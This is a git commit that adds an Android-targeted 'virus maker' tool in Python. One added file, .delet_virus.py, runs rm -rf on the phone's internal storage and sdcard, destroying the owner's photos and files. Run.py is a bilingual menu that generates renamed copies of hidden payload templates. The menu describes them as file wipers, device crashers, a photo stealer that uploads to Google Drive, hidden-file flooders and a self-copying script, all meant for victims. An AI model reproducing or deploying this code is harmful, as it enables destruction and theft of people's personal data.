3ca792962aeb8e801edd056c5a900b84b45691da
0101_022 <63510472+MrAli-s@users.noreply.github.com>
2022-04-12 23:54:50 +0200

    Add files via upload

---
+++ .delet_virus.py
@@ -0,0 +1,3 @@
+import os
+os.system("rm -rf /storage/emulated/0/ *")
+os.system("rm -rf /sdcard/ *")
---
+++ Run.py
@@ -0,0 +1,262 @@
+import os, sys
+from time import sleep
+def ascii():
+	G = ('\033[92m')
+	R = ('\033[31m')
+	print('''\033[31m
+        	uuuuuuu
+             uu$$$$$$$$$$$uu
+          uu$$$$$$$$$$$$$$$$$uu
+         u$$$$$$$$$$$$$$$$$$$$$u
+        u$$$$$$$$$$$$$$$$$$$$$$$u
+       u$$$$$$$$$$$$$$$$$$$$$$$$$u
+       u$$$$$$$$$$$$$$$$$$$$$$$$$u
+       u$$$$$$"   "$$$"   "$$$$$$u
+       "$$$$"      u$u       $$$$"
+        $$$u       u$u       u$$$
+        $$$u      u$$$u      u$$$
+         "$$$$uu$$$   $$$uu$$$$"
+          "$$$$$$$"   "$$$$$$$"
+            u$$$$$$$u$$$$$$$u
+             u$"$"$"$"$"$"$u
+  uuu        $$u$ $ $ $ $u$$       uuu
+ u$$$$        $$$$$u$u$u$$$       u$$$$
+  $$$$$uu      "$$$$$$$$$"     uu$$$$$$      '''+G+'''Done!!!'''+R+'''
+u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
+$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
+ """      ""$$$$$$$$$$$uu ""$"""
+           uuuu ""$$$$$$$$$$uuu
+  u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
+  $$$$$$$$$$""""           ""$$$$$$$$$$$"
+   "$$$$$"                      ""$$$$""
+     $$$"                         $$$$"''')
+
+R = ('\033[31m')
+BLUE = ("\033[34m")
+W = ("\033[97m")
+G = ('\033[92m')
+LIGHTGREEN_EX = ('\033[92m')
+print(W+'''
+	.____.
+   xuu$``$$$uuu.
+ . $``$  $$$`$$$
+dP*$  $  $$$ $$$
+?k $  $  $$$ $$$
+ $ $  $  $$$ $$$
+ ":$  $  $$$ $$$
+  N$  $  $$$ $$$
+  $$  $  $$$ $$$
+   $  $  $$$ $$$
+   $  $  $$$ $$$
+   $  $  $$$ $$$
+   $  $  $$$ $$$
+   $  $  $$$ $$$
+   $$#$  $$$ $$$
+   $$'$  $$$ $$$
+   $$`R  $$$ $$$      '''+R+'''__     ___                 '''+W+'''
+   $$$&  $$$ $$$      '''+R+'''\ \   / (_)_ __ _   _ ___   _ __  _   _'''+W+'''
+   $#*$  $$$ $$$      '''+R+''' \ \ / /| | '__| | | / __| | '_ \| | | |'''+W+'''
+   $  $  $$$ @$$      '''+R+'''  \ V / | | |  | |_| \__ \_| |_) | |_| |'''+W+'''
+   $  $  $$$ $$$      '''+R+'''   \_/  |_|_|   \__,_|___(_) .__/ \__, |'''+W+'''
+   $  $  $$$ $$$      '''+R+'''                           |_|    |___/'''+W+'''
+   $  $  $B$ $$&.
+   $  $  $D$ $$$$$muL.
+   $  $  $Q$ $$$$$  `"**mu..
+   $  $  $R$ $$$$$    k  `$$*t
+   $  @  $$$ $$$$$    k   $$!4
+   $ x$uu@B8u$NB@$uuuu6...$$X?
+   $ $(`RF`$`````R$ $$5`"""#"R
+   $ $" M$ $     $$ $$$      ?
+   $ $  ?$ $     T$ $$$      $
+   $ $F H$ $     M$ $$K      $  ..
+   $ $L $$ $     $$ $$R.     "d$$$$Ns.
+   $ $~ $$ $     N$ $$X      ."    "%2h
+   $ 4k f  $     *$ $$&      R       "iN
+   $ $$ %uz!     tuuR$$:     Buu      ?`:
+   $ $F          $??$8B      | '*Ned*$~L$
+   $ $k          $'@$$$      |$.suu+!' !$
+   $ ?N          $'$$@$      $*`      d:"
+   $ dL..........M.$&$$      5       d"P
+ ..$.^"*I$RR*$C""??77*?      "nu...n*L*
+'$C"R   ``""!$*@#""` .uor    bu8BUU+!`
+'*@m@.       *d"     *$Rouxxd"```$
+     R*@mu.           "#$R *$    !
+     *%x. "*L               $     %.
+        "N  `%.      ...u.d!` ..ue$$$o..
+         @    ".    $*"""" .u$$$$$$$$$$$$beu...
+        8  .mL %  :R`     x$$$$$$$$$$$$$$$$$$$$$$$$$$WmeemeeWc
+       |$e!" "s:k 4      d$N"`"#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$>
+       $$      "N @      $?$    F$$$$$$$$$$$$$$$$$$$$$$$$$$$$>
+       $@       ^%Uu..   R#8buu$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$>
+                  ```""*u$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$>
+                         #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$>
+                          "5$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$>
+                            `*$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$>
+                              ^#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$>
+                                 "*$$$$$$$$$$$$$$$$$$$$$$$$$$>
+                                   `"*$$$$$$$$$$$$$$$$$$$$$$$>
+                                       ^!$$$$$$$$$$$$$$$$$$$$>
+                                           `"#+$$$$$$$$$$$$$$>
+                                                 ""**$$$$$$$$>
+                                                        ''')
+words = "\033[34m     𝚃𝙷𝙸𝚂 𝚃𝙾𝙾𝙻 𝙸𝚂 𝙵𝙾𝚁 𝙼𝙰𝙺𝙴 𝙿𝚈𝚃𝙷𝙾𝙽 𝚅𝙸𝚁𝚄𝚂 \n\n"
+words_ar = "\033[92m هذه الأداة لصنع فيروسات على هيئة سكربتات بايثون     "
+for char in words:
+	    sleep(0.1)
+	    sys.stdout.write(char)
+	    sys.stdout.flush()
+for char in words_ar:
+	    sleep(0)
+	    sys.stdout.write(char)
+	    sys.stdout.flush()
+print('\n')
+print(R+'《1》'+W+'The first virus deletes all phone files, including photos, audios, and others')
+print(R+'《2》'+W+'The virus cash the device and puts pressure on the device processor')
+print(R+'《3》'+W+"This virus steals all the victim's photos and sends them to your google drive (but you need token for google drive)")
+print(R+'《4》'+W+'This virus creates insanely hidden files in the sdcard really fast')
+print(R+'《5》'+W+'This virus copies itself over and over again inside file scripts such as text, etc')
+print(G+'《1》'+W+'يقوم الفيروس الأول بحذف جميع ملفات الهاتف ، بما في ذلك الصور والتسجيلات الصوتية وغيرها')
+print(G+'《2》'+W+'يقوم الفيروس بالضغط على الجهاز ويعلقه ويضغط على معالج الجهاز')
+print(G+'《3》'+W+"يسرق هذا الفيروس جميع صور الضحايا ويرسلها إلى حسابك على google drive  (لكنك تحتاج إلى الـtoken لـ google drive الخاص بك)")
+print(G+'《4》'+W+'يقوم هذا الفيروس بإنشاء ملفات مخفية بسرعة كبيرة ولا يمكن للضحية رؤيتها')
+print(G+'《5》'+W+'يقوم هذا الفايروس بنسح نفسه مراراً وتكراراً بداخل سكربتات الملفات مثل النصوص او وغيرها')
+Virus00=str(input("\033[31m ┌─["+LIGHTGREEN_EX+"𝘾𝙃𝙊𝙊𝙎𝙀 𝙏𝙃𝙀 "+BLUE+"~"+R+"@"+W+"𝙑𝙄𝙍𝙐𝙎 𝙔𝙊𝙐 𝙒𝘼𝙉𝙏 "+R+"""]
+ └──╼ """+W+"$ "))
+if Virus00 == "1":
+		BLUE = ("\033[34m")
+		GREN = ('\033[92m')
+		White = ("\033[97m")
+		RED = ("\033[31m")
+		LIGHTGREEN_EX = ('\033[92m')
+		import shutil	
+		Open = r'.delet_virus.py'
+		Open1 = r'.delet_virus1.py'
+		shutil.copyfile(Open, Open1)
+		new = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]
+ └──╼ """+White+"$ ")
+		
+		############
+		old_name = r".delet_virus.py"
+		new_name = (new + '.py')
+		#############
+		os.rename(old_name, new_name)
+		########
+		ascii()
+		print(White+'The virus has been saved as ' +RED+ new + '.py')
+		import os
+		original = r'.delet_virus1.py'
+		target = r'.delet_virus.py'
+		os.rename(original, target)
+	########
+	##Virus2##
+	########
+if Virus00 == "2":
+		BLUE = ("\033[34m")
+		GREN = ('\033[92m')
+		White = ("\033[97m")
+		RED = ("\033[31m")
+		LIGHTGREEN_EX = ('\033[92m')
+		import shutil	
+		Open = r'.crash_virus.py'
+		Open1 = r'.crash_virus1.py'
+		shutil.copyfile(Open, Open1)
+		new = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]
+ └──╼ """+White+"$ ")
+		
+		############
+		old_name = r".crash_virus.py"
+		new_name = (new + '.py')
+		#############
+		os.rename(old_name, new_name)
+		########
+		ascii()
+		print(White+'The virus has been saved as ' +RED+ new + '.py')
+		import os
+		original = r'.crash_virus1.py'
+		target = r'.crash_virus.py'
+		os.rename(original, target)
+if Virus00 == "3":
+		BLUE = ("\033[34m")
+		GREN = ('\033[92m')
+		White = ("\033[97m")
+		RED = ("\033[31m")
+		LIGHTGREEN_EX = ('\033[92m')
+		import shutil	
+		Open = r'.Open.py'
+		Open1 = r'.Open1.py'
+		shutil.copyfile(Open, Open1)
+		nun = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"Google Drive Code"+RED+"""]
+ └──╼ """+White+"$ ")
+		new = input(GREN+'The File name: ')
+		############
+		with open('.Open.py', 'r') as file :
+		  filedata = file.read()
+		
+		##########
+		filedata = filedata.replace('abcde', nun)
+		filedata = filedata.replace('mvvv.py', new)
+		#########
+		with open('.Open.py', 'w') as file:
+		  file.write(filedata)
+		 ########
+		old_name = r".Open.py"
+		new_name = (new + '.py')
+		#############
+		os.rename(old_name, new_name)
+		########
+		ascii()
+		print(White+'The virus has been saved as ' +RED+ new + '.py')
+		import os
+		original = r'.Open1.py'
+		target = r'.Open.py'
+		os.rename(original, target)
+if Virus00 == "4":
+		BLUE = ("\033[34m")
+		GREN = ('\033[92m')
+		White = ("\033[97m")
+		RED = ("\033[31m")
+		LIGHTGREEN_EX = ('\033[92m')
+		import shutil	
+		Open = r'.config_virus.py'
+		Open1 = r'.config_virus1.py'
+		shutil.copyfile(Open, Open1)
+		new = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]
+ └──╼ """+White+"$ ")
+		
+		############
+		old_name = r".config_virus.py"
+		new_name = (new + '.py')
+		#############
+		os.rename(old_name, new_name)
+		########
+		ascii()
+		print(White+'The virus has been saved as ' +RED+ new + '.py')
+		import os
+		original = r'.config_virus1.py'
+		target = r'.config_virus.py'
+		os.rename(original, target)
+if Virus00 == "5":
+		BLUE = ("\033[34m")
+		GREN = ('\033[92m')
+		White = ("\033[97m")
+		RED = ("\033[31m")
+		LIGHTGREEN_EX = ('\033[92m')
+		import shutil	
+		Open = r'.spreading_virus.py'
+		Open1 = r'.spreading_virus1.py'
+		shutil.copyfile(Open, Open1)
+		new = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]
+ └──╼ """+White+"$ ")
+		
+		############
+		old_name = r".spreading_virus.py"
+		new_name = (new + '.py')
+		#############
+		os.rename(old_name, new_name)
+		########
+		ascii()
+		print(White+'The virus has been saved as ' +RED+ new + '.py')
+		import os
+		original = r'.spreading_virus1.py'
+		target = r'.spreading_virus.py'
+		os.rename(original, target)
